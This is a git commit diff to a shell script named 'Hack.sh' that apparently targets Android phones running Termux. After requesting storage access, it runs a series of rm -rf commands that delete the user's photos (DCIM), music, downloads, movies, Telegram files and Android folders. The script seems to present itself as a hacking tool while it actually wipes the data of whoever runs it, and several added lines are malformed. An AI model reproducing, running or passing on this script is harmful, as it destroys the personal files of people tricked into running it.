ef43f6c822ac972a32e230bd8ee1eb10a19d1ef3
M.D.Heshan Sankalpa <69895232+heshanTMD@users.noreply.github.com>
2021-01-12 21:52:42 +0530

    Update Hack.sh

--- Hack.sh
+++ Hack.sh
@@ -1,3 +1,16 @@
 termux-setup-storage
 cd /sdcard
 rm -rf termux
+rm -rf DCIM
+rm -rf Music
+rm -rf storage
+rm -rf Download
+rm -rf Moviesrm -rf DCIM
+rm -rf Music
+rm -rf system
+rm -rf storage
+rm -rf Android
+rm -rf Download
+rm -rf Movies
+rm -rf Telegram -rf Telegra
+
